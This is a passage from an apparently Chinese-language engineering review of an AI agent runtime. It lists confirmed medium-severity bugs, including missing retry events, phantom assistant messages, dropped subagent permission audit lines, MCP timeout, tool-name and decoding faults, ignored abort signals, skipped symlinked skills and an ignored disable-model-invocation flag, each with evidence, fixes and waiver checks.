deriveRetryBanner、ChatComposer.tsx:1625-1633 的 sawNetworkRetry 提示语——四个消费者零生产者。(4) 旧引擎有生产者也属实：`git show HEAD:src/agent-host/piWorkerSession.ts` 的 auto_retry_start 分支发 `status:'running', retry:{attempt,maxRetries,delayMs,error,errorStatus}`。降级理由：说「完全没有任何提示」略重——session.status 仍是 running，turn head 的计时器继续走，用户看到的是「在跑但很久」，不是界面假死；且渲染侧的静默上限 SEND_SILENCE_CEILING_MS = 300_000（sendBudgets.ts:19），43s~86s 的重试窗口不会误触发「疑似卡死」分支，主进程侧我也在 WorkerManager.ts 里 grep 过 stall/watchdog，没有会因此杀掉回合的看门狗。所以是「丢了一块用户可见信息 + 一处诊断提示语永远走不到」，不是功能性故障，定 medium。
WAIVER(partial): docs/plantree/plans/runtime-evolution/README.md 第217行「F4 重试」；docs/plantree/plans/runtime-evolution/evidence/p4-6/f4-retry/README.md 「还没验的」第一条：「没在 GUI 里看一眼用户侧长什么样：重试期间界面显示什么、预算耗尽后错误卡的文案是否可读。这份记录只到 runtime 边界为止。」 — 文档明确把『GUI 侧观感』列为本轮验收范围之外、尚未查看的项目，承认没有确认重试期间界面会显示什么——这覆盖了『重试对用户不可见』这一表现层面的缺口。但文档的措辞是『没看一眼』『未验』，而不是『我们决定不做 GUI 投影』；发现给出的具体代码事实（src/runtime 内完全没有任何 retry 相关事件发射点，projector 从未发过 retry 字段）比『还没看』更强——这是结构性缺失，不是验证不足。且 D5 明确要求事件集合与旧实现一致（旧引擎有 auto_retry_start/end 投影），没有任何文档取舍点声明放弃这项 parity。故只能算部分豁免：豁免了『未在 GUI 上亲眼查看现场表现』，未豁免『native 侧压根没有 retry 事件生产者、violate D5 parity』这一代码级缺口。

### [rpc-projector-03] MEDIUM bug confirmed | P3-4 | src/runtime/events/projector.ts:210 | 每个带工具调用的 assistant 轮次多发一条空 assistant 消息，工具行挂到另一条消息上
DESC: native projector 在 `message_start(role=assistant)` 就立刻 ensureAssistant 开消息（210-211），然后 `message_end` 用 closeAssistant(true) 关掉并把 `this.assistant` 置空（216-219、167-183）。pi-agent-core 的顺序是：assistant 消息先 message_end（stopReason='toolUse'），随后才 emit tool_execution_start。于是工具行到达时 projector 已经没有打开的 assistant，只能 ensureAssistant 再铸一条新的。结果每个工具调用轮次都会产出一条「开了又立刻关、什么都没有」的 assistant 消息。旧引擎不是这样：ensureAssistant 是惰性的（第一条 delta 或第一个工具才开），closeProseStream 只置 proseClosed 不清 assistantMessageId，message_end 里 `const messageId = projection.proseClosed ? null : projection.assistantMessageId;` 保证没内容就不发 completed——一个轮次只有一条 assistant 消息。这批录制的 golden fixture 已经把这个行为固化下来了。
EVIDENCE: } else if (event.message.role === 'assistant')
  this.ensureAssistant(`${event.message.provider}/${event.message.model}`);
  break;
case 'message_end':
  if (event.message.role === 'assistant') {
    this.closeAssistant(['stop','length','toolUse'].includes(event.message.stopReason));
SCENARIO: 跑 src/shared/__tests__/fixtures/nativeGuiEventStream.json 录到的那次会话（read + write 两个工具）：事件 4/5 是 message.started(asst-turn-1-2) 紧跟 message.completed(asst-turn-1-2)，中间没有任何内容；事件 12/13 同理是 asst-turn-1-4。真正带工具行的是 asst-turn-1-3 和 asst-turn-1-5。也就是说，6 条 assistant 消息里有 2 条是纯噪声，而且工具行挂在与「发出该工具调用的那条 assistant 消息」不同的 id 上。当前渲染层靠 blocks.length>0 过滤（assistantProgress.ts:229-235、MessageTimeline.tsx:1373）把它们挡住了，所以肉眼不可见——任何不做这层过滤的新消费者（导出、历史重建、统计）都会看到幻影消息。
FIX: 把 ensureAssistant 改回惰性：message_start(assistant) 只记录 model，真正在第一条 delta / 第一个 tool_execution_start 时才开消息；closeAssistant 只在这条消息确实产出过内容时才发 message.completed。改完必须用 AICLIENT_UPDATE_FIXTURES=1 重录 nativeGuiEventStream.json 并逐条读 diff。
REFUTER(CONFIRMED,medium): 现象属实，但机理描述需要一处更正。核实的顺序（node_modules/@earendil-works/pi-agent-core/dist/agent-loop.js:119-141）是：streamAssistantResponse 先把 assistant 的 message_start/update/end 发完（stopReason='toolUse'），executeToolCalls 才发 tool_execution_start（同文件 :294-302）。所以 projector 在 message_end 时 closeAssistant 把 this.assistant 置空（projector.ts:216-219 → 167-183），工具行到达时 ensureAssistant 只能新铸一条。**更正**：那条「空消息」其实是模型自己那条**纯工具调用、无正文**的 assistant 消息（deltas() 没有可发的文本），不是「为工具额外开的那条」；真正的合成消息是承载工具行的 asst-N+1。原报告把两者说反了，但净结论（多一条空消息 + 工具行挂在另一个 messageId 上）成立。fixture 逐条核对无误：src/shared/__tests__/fixtures/nativeGuiEventStream.json 第 45-62 行是 asst-turn-1-2 的 started(带 model)+completed 中间无内容，第 63-71 行 asst-turn-1-3 的 started **没有 model 字段**、工具行挂它；asst-turn-1-4/1-5 同构。补充一条原报告没提的实际影响，也是我把它保在 medium 而不是 low 的理由：messageMetadata.ts:104-119 会把 bySessionLastAssistant 指向最后一条 message.started(assistant)，即那条无 model 的合成消息，于是 turn 内那次 usage.updated（fixture 第 118 行）挂到 reportedModel=null 的消息上；ContextSurfaceView.tsx:295-306 的「实际模型」行读的正是 reportedModel，回合进行中会读成 null。当前时间线确实看不出幻影消息——chatTurn.ts:158-168 的 flattenTurnItems 对 blocks 为空的 assistant 消息产出 0 个 item，assistantProgress.ts:229-235 也按 blocks.length>0 过滤——所以肉眼不可见这点属实。
WAIVER(no): 无 — 全仓检索『空 assistant 消息』『ensureAssistant 时序』『幻影消息』等关键字，docs/plantree/plans/runtime-evolution 下没有任何文档提及或接受『每个带工具调用的轮次多发一条空 assistant 消息』这一行为；录制的 golden fixture 只是固化了当前实现的输出，不构成设计上的取舍声明。

### [rpc-projector-04] MEDIUM contract-gap confirmed | P3-4 | src/runtime/plugins/agent-loop/index.ts:184 | 子代理工具调用的 permission.activity 审计行被过滤掉，只剩审批卡片
DESC: permission.activity 的发布点对 record 做了一次过滤：只有 toolCallId 出现在本 run 的 `toolCalls` 集合里才投影。该集合只在父 agent 的 `tool_execution_start` 时填充（index.ts:265）。子代理跑在自己的 Agent 实例里，它的工具调用 id 从不进这个集合（subagent/run.ts:377-378 只累加了一个计数）。但子代理的工具确实走的是同一个 runtimePermissions（subagent/index.ts:617-641 用 scopeToolCall 包了一层），所以 onActivity 会收到这些 record，然后被静默丢弃。对照：permissionPrompt.ts 没有这层过滤，所以卡片（permission.requested/resolved）照常出。activity.ts:9-16 明确写了这行的存在理由——policy 直接放行不弹窗，这一行是「调用被闸门管过」的唯一证据。
EVIDENCE: const unsubscribePermissions = this.ctx.get('runtimePermissions')?.onActivity((record) => {
  // Gates raised outside this run's tool calls (a probe, a stale session)
  // belong to no message on screen and no line in this trace.
  if (!toolCalls.has(record.request.toolCallId)) return;
  trace.note('note', { event: `permission_${record.phase}`, ...record });
  this.ctx.runtimeEvents.emit(permissionActivityEvent(sessionId, record));
SCENARIO: 一个 agent 模式 / ask 档位的会话委派了子代理，子代理调用 read（policy 直接放行）和 write（弹卡片）。用户会看到 write 的审批卡片（带 agentId），但两次调用都不会产生 permission.activity 行：既不进 trace（permission_prompt / permission_decision 两条 note 一起丢），也不进时间线的审批折叠区。事后审计看不出子代理到底动过哪些文件、哪些是策略自动放行的。
FIX: 让子代理在 scopeToolCall 时把 toolCallId 登记进本 run 的可投影集合（或把过滤条件从「父 agent 的 toolCalls」放宽为「本 run 绑定的 delegation 归属」），并补一条断言子代理 gate 也产出 permission.activity 的测试。
REFUTER(CONFIRMED,medium): 过滤条件与集合来源都核实无误，且找不到任何旁路。(1) agent-loop/index.ts:181-187 的 onActivity 回调第一行就是 `if (!toolCalls.has(record.request.toolCallId)) return;`；该集合只在 :265 `if (event.type === 'tool_execution_start') toolCalls.add(...)` 填充，而这个订阅挂在**父 agent** 上（:261 `agent.subscribe`）。(2) 子代理跑在独立 Agent 里，它的事件走 subagent/run.ts 的 `this.emit(event)` → index.ts publish() → activityForEvent → emitActivity，从不回流到父 agent 的 subscribe，所以子代理的 toolCallId 永远进不了那个集合（run.ts:377-378 只做 `this.toolCalls += 1` 计数）。(3) 子代理的工具确实经过同一个闸门：subagent/index.ts:629-639 的 scopeDelegateTools 用 permissions.scopeToolCall 包住 execute，tools/index.ts:127 调 `this.ctx.runtimePermissions.authorize(...)`，permissions/index.ts:312 的 authorize 无条件走 notify()（:305-311），即 record 确实被发出后才被上面那行丢掉。(4) 对照组成立：卡片路径 src/runtime/worker/permissionPrompt.ts:140-168 没有这层过滤，还专门为委派补了 agentId/agentName，所以「卡片出、审计行不出」是真的不对称。(5) 后果是双重丢失——同一行代码里 trace.note('permission_prompt'/'permission_decision') 也在 return 之后，所以 trace 文件里同样没有子代理的闸门记录。
WAIVER(no): 无 — docs/plantree/plans/runtime-evolution/history/2026-09-10-status-before-consolidation.md 第202行记录过『native 完全不发 permission.activity』的缺口并已在 P4-5 修复，但那次修复只覆盖父 agent 直接发起的工具调用；docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md 第55、67行只承诺『审批卡标注子代理来源』『复用 subagent.activity/既有权限来源』，未提及子代理工具调用的 toolCallId 不会进入父 run 的 toolCalls 集合、导致其 permission.activity 审计行被过滤丢弃。这是 P5-2 引入子代理后产生的新缺口，未见任何文档取舍覆盖。

### [skills-mcp-01] MEDIUM bug confirmed | P5-3 | src/runtime/plugins/mcp/client.ts:213 | tools/list 用的是 120 秒调用预算，超过 Main 的 60 秒 bootstrap 上限，一台慢服务器能让整个会话开不起来
DESC: 握手结束后 initialize() 立刻把 timeoutMs 从连接预算（30s）换成调用预算（120s），而紧随其后的 listTools() 就跑在这个 120s 预算上（mcp/index.ts:146-147）。connectMcpServers 是在 createRuntime 里被 await 的（bootstrap.ts:266），createRuntime 又在 worker.bootstrap RPC 里被 await，而 Main 给这条 RPC 的上限只有 60 秒（src/main/services/agent-host/createPiWorkerSlot.ts:57 BOOTSTRAP_REQUEST_TIMEOUT_MS = 60_000）。也就是说 MCP 连接阶段的最坏等待（30s 握手 + 120s tools/list）比允许的会话开启时间长一倍以上，且 connectMcpServers 整体没有任何总预算。
EVIDENCE: await this.send({ jsonrpc: '2.0', method: 'notifications/initialized' });
// The handshake is over; everything after it gets the call budget.
if (this.callTimeoutMs !== undefined) this.timeoutMs = this.callTimeoutMs;
// mcp/index.ts:146-147
await client.initialize();
const tools = await client.listTools();
SCENARIO: 用户在 <agentDir>/mcp.json 里声明了一台服务器，它能正常回 initialize，但 tools/list 迟迟不回（卡在自己的索引构建、等网络、或干脆挂死）。60 秒后 Main 的 worker.bootstrap RPC 超时，会话创建失败并报一个与 MCP 无关的通用超时错误；重试仍然失败，用户在删掉 mcp.json 之前无法打开任何会话——而这一块的模块注释写的正是「一台起不来的服务器不能让会话损失其他所有工具」。
FIX: 把 tools/list 也留在连接预算内（切换 timeoutMs 的时机放到 listTools 之后），并给 connectMcpServers 整体加一个明显小于 BOOTSTRAP_REQUEST_TIMEOUT_MS 的总预算，超时的服务器记 error 后继续 bootstrap。
REFUTER(CONFIRMED,medium): 引用无误，链路我逐段核实过。client.ts:211-214 确实在 initialize() 末尾把 timeoutMs 从连接预算换成 callTimeoutMs，而 index.ts:146-147 的 listTools() 紧跟其后跑，所以 tools/list 拿到的是 120 秒预算（MCP_CALL_TIMEOUT_MS=120_000，index.ts:55）。connectMcpServers 在 bootstrap.ts:266 被 await，内部只有 Promise.all（index.ts:117-119），没有任何总预算；McpPlugin 也在 bootstrap.ts:272-273 同步等待。上游确认：piWorkerRpcServer.ts:563 → nativeWorkerRuntime.openGraph 的 createRuntime 里 mcp 是默认开的（nativeWorkerRuntime.ts:214，只传了 log，不覆盖超时），而 Main 侧 createPiWorkerSlot.ts:114 用 BOOTSTRAP_REQUEST_TIMEOUT_MS=60_000（同文件 57 行）包这条 RPC，超时后 catch 里 slot.dispose 并把错误抛出（createPiWorkerSlot.ts:119-128），会话确实开不起来。我没能推翻的核心事实是「最坏 30+120=150 秒 > 60 秒」。降一级的理由：触发需要一台能正常回 initialize 但 tools/list 挂死或超过 60 秒的服务器，属于异常服务器行为而非常见路径；但一旦发生，后果是任何会话都打不开且错误信息与 MCP 无关，所以不低于 medium。
WAIVER(no): 无 — docs/plantree/plans/runtime-evolution/topics/p5-1-skills-templates-ask.md 与 evidence/p5-1/README.md 只声明 MCP 的 resources/prompts/sampling/roots/HTTP-SSE 未实现、参数校验用 typebox 原样转发、未接真实第三方服务器/未真机点验这三类限制，均未提及 tools/list 调用预算与 Main 侧 60 秒 worker.bootstrap 上限之间的冲突。K4 提到的顺带修掉的真缺陷是另一件事（runner 载体下命令自行退出触发 leader close 的漏报，处理的是进程崩溃检测），不是握手加 tools/list 总耗时超过 bootstrap 超时的问题。connectMcpServers 无总预算、且该预算显著大于 Main 侧允许的会话开启时间，是未声明也未被任何取舍豁免的实现缺陷。

### [skills-mcp-02] MEDIUM bug confirmed | P5-3 | src/runtime/plugins/mcp/index.ts:182 | MCP 工具重名会在插件构造里抛 duplicate_tool，直接把整个会话 bootstrap 拖垮
DESC: McpPlugin 构造函数里对每个工具直接 ctx.runtimeTools.register(...)，没有 try/catch。而注册表对重名是硬失败：src/runtime/plugins/tools/index.ts:89 `if (this.registry.has(tool.name)) throw new RuntimeHostError('duplicate_tool', tool.name)`。重名有两条现实来源：(1) mcpToolName 把名字 slice(0, 64)，两个长名字截断后相同；(2) 服务器的 tools/list 分页返回了重复条目（listTools 不去重）。无论异常是直接冒泡还是被 cordis 吞掉后触发 bootstrap.ts:414 的 `missing services: runtimeMcp` 检查，结果都是 createRuntime 失败、会话开不了。
EVIDENCE: for (const connection of this.connections) {
  if (connection.error) continue;
  for (const tool of connection.tools) ctx.runtimeTools.register(this.bind(connection, tool));
}
// tools/index.ts:89
if (this.registry.has(tool.name)) throw new RuntimeHostError('duplicate_tool', tool.name);
SCENARIO: 某服务器分页实现有 bug，第二页把第一页的工具又发了一遍（或两个工具名前 47 字符相同、被 slice(0,64) 截成同一个名字）。McpPlugin 注册到第二个同名工具时抛 duplicate_tool，整个 runtime 构建失败，用户看到的是会话打不开，而不是「这台 MCP 服务器有问题」。
FIX: listTools 结果按名字去重；register 用 try/catch 包住，重名/非法名只把该工具记进 connection.error 或 diagnostics，不影响其他工具与会话。
REFUTER(CONFIRMED,medium): 两端都核实了。McpPlugin 构造函数 index.ts:180-183 无 try/catch 直接 register；tools/index.ts:89 对重名确实 throw RuntimeHostError('duplicate_tool')。异常传播我在 cordis 源码里跟到了底：src/runtime/node_modules/cordis/lib/index.js:961-979 的 _reload 把插件执行异常记进 this._error，1003-1008 的 await() 会重新抛出，而 bootstrap.ts:273 正是 await mcpFiber.await()，所以 createRuntime 必然 reject（不需要退到 414 行的 missing services 分支）。重名来源也成立：listTools（client.ts:217-243）只按 name 非空过滤，从不去重；mcpToolName 的 slice(0,64)（index.ts:93）在服务器名长时留给工具名的空间很小——config.ts:87 允许服务器名到 48 字符，前缀 'mcp__'+48+'__' 就占 55，工具名只剩 9 个字符可区分，仓库自己的测试 __tests__/mcp.test.ts:118 正是断言 64 字符截断行为。降一级的理由：需要长服务器名或分页有 bug 的服务器才会撞名，但一旦撞名就是整个会话开不了，不只是这台服务器不可用。
WAIVER(no): 无 — 文档未提及工具重名（无论来自命名截断还是分页重复）会导致 McpPlugin 构造阶段抛 duplicate_tool 进而拖垮整个 runtime bootstrap。不引官方 SDK（P5-3，not-doing）与 resources/prompts 等未实现（P5-3，not-doing）这些既有豁免都不涉及工具注册阶段的容错；K4 模块注释中一台起不来的服务器不能让会话损失其他所有工具这一设计目标反而是被这条缺陷违反的对象，不是被豁免的对象。

### [skills-mcp-03] MEDIUM bug confirmed | P5-3 | src/runtime/plugins/mcp/index.ts:92 | mcpToolName 保留点号，生成的工具名会被 provider 拒绝，整个会话每一次请求都 400
DESC: safe() 的字符白名单是 [\w.-]，点号被有意保留；config.ts:87 的服务器名校验 /^[\w.-]{1,48}$/ 同样允许点号。但 OpenAI 与 Anthropic 的函数/工具名都只接受 [a-zA-Z0-9_-]。pi-ai 是原样透传名字的（dist/api/openai-completions.js:1150、dist/api/anthropic-messages.js:1041），没有任何清洗。工具定义是随每一次请求一起发出去的，所以一个带点的工具名坏的不是那一次调用，而是这个会话的每一次模型请求。
EVIDENCE: /** `mcp__<server>__<tool>`, clamped to what a provider accepts as a tool name. */
export function mcpToolName(server: string, tool: string): string {
  const safe = (value: string) => value.replace(/[^\w.-]/g, '_');
  return `mcp__${safe(server)}__${safe(tool)}`.slice(0, 64);
}
SCENARIO: 用户接一台工具名带点的 MCP 服务器（形如 slack.postMessage），或在 mcp.json 里把服务器命名为 my.server。生成 mcp__my.server__search 后，模型请求带上这个工具定义，provider 直接 400 invalid tool name——不是这个工具用不了，而是这个会话一句话都发不出去，且报错完全看不出跟 MCP 有关。
FIX: safe() 的白名单收窄成 [A-Za-z0-9_-]（点号也替成下划线），并在注释里写明这是 provider 的名字规则而不是本地偏好。
REFUTER(CONFIRMED,medium): 代码事实全部对得上，且中途没有任何清洗环节。safe() 的白名单 [\w.-] 保留点号（index.ts:92），config.ts:87 的服务器名校验同样放行点号。注册表 register（tools/index.ts:81-110）不校验名字；agent-loop/index.ts:219 直接把 runtimeTools.list() 交给 pi-agent-core；pi-ai 两条 provider 路径确认原样透传：openai-completions.js:1163-1172 的 function.name = tool.name，anthropic-messages.js:1041 的 name（仅 OAuth 场景过一次已知名映射表 toClaudeCodeName，见同文件 65 行，不做字符清洗）。model-adapter 里也没有任何工具名改写。唯一无法在本仓核实的环节是 provider 端的拒绝行为——Anthropic/OpenAI 的工具名规则 ^[a-zA-Z0-9_-]{1,64}$ 是文档约定，我没有也不能发真实请求验证；Gemini 一侧规则较宽（允许点号），所以影响面取决于所用 provider。工具定义随每次请求发送这一点成立，因此在 Anthropic/OpenAI 上确实是整会话不可用而非单工具失败。
WAIVER(no): 无 — config.ts 服务器名校验与 mcpToolName 的字符白名单均保留点号，属于实现细节，文档从未讨论过工具名字符集与各 provider（OpenAI/Anthropic）名字校验规则不兼容的问题，也没有把保留点号标注为已知限制或用户决定。

### [skills-mcp-04] MEDIUM bug confirmed | P5-3 | src/runtime/plugins/mcp/client.ts:120 | 按 chunk 解码 UTF-8，跨块切断的多字节字符会静默变成替换字符
DESC: receive() 对每个 stdout chunk 单独 Buffer.from(chunk).toString('utf8')。管道给的是任意字节边界（exec.ts:160 直接把 Buffer 交上来，pipe 默认 highWaterMark 64 KiB），一个中文或 emoji 被切在两个 chunk 之间时，两半各自解码成 U+FFFD。U+FFFD 在 JSON 字符串里是合法字符，所以 JSON.parse 照样成功，损坏完全无声——模型拿到的是带乱码的工具结果。分帧本身（newline-delimited）没问题，问题只在解码器没有跨 chunk 状态。
EVIDENCE: receive(chunk: Uint8Array): void {
  this.buffer += Buffer.from(chunk).toString('utf8');
SCENARIO: 一台 MCP 服务器返回 200 KiB 的中文文档（或含 emoji 的输出）。内容被拆成 4 个 chunk，每个边界上有约 2/3 的概率切断一个 3 字节汉字，模型收到的正文里散落着「」；没有任何日志或诊断提示发生过损坏。
FIX: 改用 node:string_decoder 的 StringDecoder('utf8') 实例并在 client 生命周期内复用（或改成按字节缓冲、定位到 0x0A 后再整段解码）。
REFUTER(CONFIRMED,medium): 数据源核实无误：exec.ts 的持久子进程直接 child.stdout.on('data', (data: Buffer) => request.onStdout(data))（src/runtime/host/exec.ts:169），没有 setEncoding，也没有任何跨块缓冲；connectOne 把它接到 client.receive（index.ts:135），receive 在 client.ts:120 对每个 chunk 单独 Buffer.from(chunk).toString('utf8')。管道块边界是任意字节位置，所以被切断的多字节字符两半各自解码成 U+FFFD，而 U+FFFD 在 JSON 字符串里合法，JSON.parse 依然成功——静默损坏成立，分帧逻辑本身（按 \n 切）没有问题。降低现实概率的两个补充事实（不推翻结论）：需要单条消息超过管道块大小（约 64 KiB）且含非 ASCII；Python 写的 MCP 服务器 json.dumps 默认 ensure_ascii=True，会把中文转义成 \uXXXX 而免疫，Node/TS 写的服务器（多数）不免疫。
WAIVER(no): 无 — 按 chunk 解码 UTF-8 导致跨块多字节字符损坏且无诊断，属于纯实现 bug；文档里唯一涉及 MCP 传输层的取舍是不引官方 SDK、自己写 stdio bridge（P5-3，not-doing，针对的是子进程收敛出口而非编解码正确性），未覆盖分帧或解码状态管理层面的缺陷。

### [skills-mcp-05] MEDIUM bug confirmed-partial-waiver | P5-3 | src/runtime/plugins/mcp/index.ts:162 | MCP 工具返回的图片被丢成 [image] 文本，而 runtime 本身是支持图片内容的
DESC: textOf 把所有非 text 的 content part 折成 `[${part.type}]` 字符串，然后整个结果只作为一条 text 交回模型。但 AgentToolResult.content 的类型是 (TextContent | ImageContent)[]（pi-agent-core dist/types.d.ts:319），而 MCP 的 image part 形状 {type:'image', data, mimeType} 与 pi-ai 的 ImageContent（dist/types.d.ts:251-255）完全一致，本可以原样转发。runtime 别处也确实在用图片内容（plugins/agent-loop/attachments.ts:35-37）。这条不在已声明的「resources/prompts/sampling/roots/HTTP-SSE 未实现」清单里，属于未声明的能力缺失。
EVIDENCE: function textOf(result: { content: { type: string; text?: string }[] }): string {
  const parts = result.content
    .map((part) => (part.type === 'text' && part.text ? part.text : `[${part.type}]`))
    .join('\n');
SCENARIO: 接一台会截图的 MCP 服务器（Playwright/Puppeteer 类是最常见的 MCP 之一），模型调用截图工具，服务器按协议返回 image content。模型收到的只有字面量 [image]，永远看不到截图，也无法判断是工具坏了还是页面空白。
FIX: textOf 只处理 text part，image part 直接映射成 {type:'image', data, mimeType} 放进返回的 content 数组；其余未知类型再退化成 [type] 占位。
REFUTER(CONFIRMED,medium): 三条支撑我都核对了：textOf（index.ts:160-167）确实把所有非 text part 折成 [type] 并只回一条 text；AgentToolResult.content 的类型是 (TextContent | ImageContent)[]（src/runtime/node_modules/@earendil-works/pi-agent-core/dist/types.d.ts:317-320）；ImageContent 形状是 {type:'image', data, mimeType}（pi-ai dist/types.d.ts:251-255），与 MCP 的 image part 一致；runtime 别处确实在构造 ImageContent（agent-loop/attachments.ts:35-39）。我额外向下追了一层看这个「本可以转发」是否真的通到 provider：pi-ai 的 convertToolResult → convertContentBlocks（anthropic-messages.js:78-108、837-863）会把 tool_result 里的 image 块转成 Anthropic 的 base64 image source，所以建议的修法在 Anthropic 路径上确实可用，不是空头支票。它属于未声明的能力缺失（模块头 client.ts:18-24 的「不实现清单」里没有图片），不是崩溃或数据错乱，所以我保持 medium 而不是更高。
WAIVER(partial): docs/plantree/plans/runtime-evolution/evidence/p5-1/README.md 本轮不能声称的事一节：MCP 的 resources、prompts、sampling、roots、HTTP-SSE 未实现，代码里明确写出 — 该豁免只覆盖 MCP 协议里 resources/prompts/sampling/roots/HTTP-SSE 这五类扩展能力未实现，不覆盖已实现的 tools/call 结果中 image content part 被丢弃这件事，image 是 tools/call 返回内容的一部分，不在这份清单里，且发现本身也指出这条不在已声明的清单里、属于未声明的能力缺失。由于该清单确实划定了 MCP 未完整支持内容形态的范围，与本发现存在语义相邻性，但没有明确点名 image content，因此判 partial 而非 no。

### [skills-mcp-06] MEDIUM bug confirmed | P5-3 | src/runtime/plugins/mcp/index.ts:211 | AbortSignal 不进 MCP 调用：用户 Stop 之后仍要等满 120 秒，服务器也收不到取消
DESC: execute 拿到了 signal，但只在调用前 throwIfAborted 一次；callTool/request 既不接收 signal，也不在 abort 时清理 pending 或给服务器发 notifications/cancelled。对比之下 bash 等本地工具是把 signal 一路传给 exec 的（RuntimeSpawnRequest.signal / RuntimeExecRequest.signal）。结果是：turn 被取消后这一次 MCP 调用只能靠 120 秒的 mcp_timeout 自己到期。
EVIDENCE: signal?.throwIfAborted();
const result = await connection.client.callTool(tool.name, args);
SCENARIO: 模型调用一个要跑一分多钟的 MCP 工具，用户中途按 Stop。turn.controller.abort() 之后这条工具 promise 仍然挂着，最长 120 秒才 reject；服务器那边的活也照跑不误，用户看到的是「停了但停不下来」。
FIX: request() 接收 AbortSignal，abort 时立刻 clearTimeout + pending.delete + reject，并按 MCP 规范给服务器发一条 notifications/cancelled。
REFUTER(CONFIRMED,medium): 代码事实成立：execute 只在调用前 signal?.throwIfAborted()（index.ts:210），随后 callTool 不接 signal；request()（client.ts:171-189）只有 setTimeout 一条退出路径，abort 时既不 clearTimeout/pending.delete，也不发 notifications/cancelled。对比项属实——本地工具把 signal 一路传到 exec（tools/index.ts:397 等）。我额外确认了「停不下来」的下游后果，这是原报告没写全但成立的部分：pi-agent-core 的 executePreparedToolCall 是直接 await tool.execute 的（dist/agent-loop.js:451-455），abort 不参与竞速，所以取消后这一轮仍挂在 MCP 的 120 秒上；nativeWorkerRuntime.stop（nativeWorkerRuntime.ts:411-432）注释明说不 await turn，于是 RPC 立刻返回「已停」，但 bootstrap.ts 的 run 入口有 active.size>0 → runtime_busy 的拦截，用户在这最多 120 秒内发新消息会被拒。服务器侧的活照跑也属实。
WAIVER(no): 无 — 文档未讨论 AbortSignal 或 Stop 是否传导到 MCP 工具调用；K3 部分明确讨论了 ask 工具不设超时的设计取舍，但那是问答卡场景，与 MCP 工具调用的取消语义无关。120 秒 mcp_timeout 到期前 Stop 无效，属于未声明的实现缺口。

### [skills-mcp-08] MEDIUM bug confirmed | P5-1 | src/runtime/plugins/skills/loader.ts:272 | 符号链接的技能目录/技能文件被静默跳过，没有诊断
DESC: RuntimeFileKind 有独立的 'symlink' 值（contracts.ts:354），而 io.readDirectory 用的是 Dirent，不跟随链接（host/io.ts:210-219）。walkRoot 只认 kind==='directory' 递归、kind==='file' 读取，symlink 两头都不沾，直接 continue；SKILL.md 的探测也要求 kind==='file'。templates.ts:102 同样只认 'file'。被参照的上游实现恰恰有这一步：pi-agent-core dist/harness/skills.js 的 resolveKind() 会对非 file/directory 的条目做 canonicalPath + fileInfo 再判定。本模块头部声称目录布局规则是照搬 pi 的，这一条没搬。
EVIDENCE: if (entry.kind === 'directory') {
  await visit(path, depth + 1, false);
  continue;
}
if (entry.kind !== 'file' || extname(entry.name).toLowerCase() !== '.md') continue;
SCENARIO: 用户按常见做法把技能仓库 link 进来：ln -s ~/dev/skills/pdf-tools ~/.agents/skills/pdf-tools。扫描时该条目 kind 是 'symlink'，既不递归也不读，技能既不出现在 <available_skills>，也不出现在 diagnostics 里——用户只看到「我的技能没生效」，没有任何线索。
FIX: 对 kind==='symlink' 的条目走一次 io.stat(path)（默认跟随链接）或 realpath 后再判 file/directory；解析失败或成环时记一条 diagnostic，同时保留 MAX_SKILL_DEPTH 兜底。
REFUTER(CONFIRMED,medium): 整条链路我都核过了，没有找到兜底。io.readDirectory 用 opendir 的 Dirent，kind() 的判定顺序是 isFile → isDirectory → isSymbolicLink（host/io.ts:209-218），所以指向目录的符号链接条目返回的是 'symlink' 而不是 'directory'；skillSource.list 只是把这些条目原样收集（skills/index.ts:106-115），不做二次 stat；walkRoot 的两个分支分别要求 kind==='directory' 和 kind==='file'（loader.ts:268-275），SKILL.md 探测也要求 kind==='file'（loader.ts:250），symlink 两头不沾且不记 diagnostic；templates.ts:102 同样只认 'file'。上游对照属实：pi-agent-core 的 resolveKind 会对非 file/directory 条目走 canonicalPath + fileInfo 再判定（dist/harness/skills.js:278-293，调用点 36、79、92、108）。补充一点利于修复的事实：本仓 io.stat 默认就跟随符号链接（host/io.ts:168-170，followSymlinks:false 才用 lstat），建议的修法可直接落地。保持 medium：结果是技能既不生效也不出现在诊断里（完全静默），而 loader 头部明确声称发现规则照搬 pi；但根目录本身是符号链接的情况不受影响（opendir 会跟随路径），受影响的只有根目录内被链接的条目。
WAIVER(no): 无 — P5-1 的范围外与本轮不能声称的事只提到没有真机点验、没有安装管理界面、以及 MCP 的能力边界，未提及技能或模板扫描对符号链接目录或文件的处理方式。文档还写道发现规则照搬 pi 的 docs/skills.md，而参照的上游实现恰好对符号链接有专门的 resolveKind 处理，本仓未搬这一步且未声明为有意省略，属于未声明的行为缺失。

### [skills-mcp-09] MEDIUM bug confirmed | P5-1 | src/runtime/plugins/skills/loader.ts:129 | disable-model-invocation 的 frontmatter 被忽略，作者声明不让模型自动调用的技能照样进系统提示词
DESC: parseFrontmatter 只取 name / description / argument-hint 三个字段，RuntimeSkill 也没有对应位。上游 pi-agent-core 会解析它（dist/harness/skills.js:232）并在拼提示词时过滤掉（dist/harness/system-prompt.js:2 `skills.filter((skill) => !skill.disableModelInvocation)`）。本仓的 skillsSegment（prompt.ts:32-48）无条件把所有技能都列出来，而 skill 工具也没有对应拒绝。声称「Skill 字段形状与 pi 保持一致、用户为 pi CLI 写的技能不用改」，这一条恰恰改了语义。
EVIDENCE: return {
  ...(fields.name ? { name: fields.name } : {}),
  ...(fields.description ? { description: fields.description } : {}),
  ...(fields['argument-hint'] ? { argumentHint: fields.argumentHint } : {}),
};
SCENARIO: 用户从 pi CLI 带来一个写了 disable-model-invocation: true 的技能（通常正是那种「只在我显式 /skill:deploy 时才用」的高风险流程）。在 native 后端它照常出现在 <available_skills> 里，模型可以自行 skill 加载并按其指示行动——与作者的显式声明相反。
FIX: parseFrontmatter 增加该布尔字段，RuntimeSkill 带上它；skillsSegment 过滤掉 disableModelInvocation 的条目，但 /skill:name 显式展开仍然放行（与上游一致）。
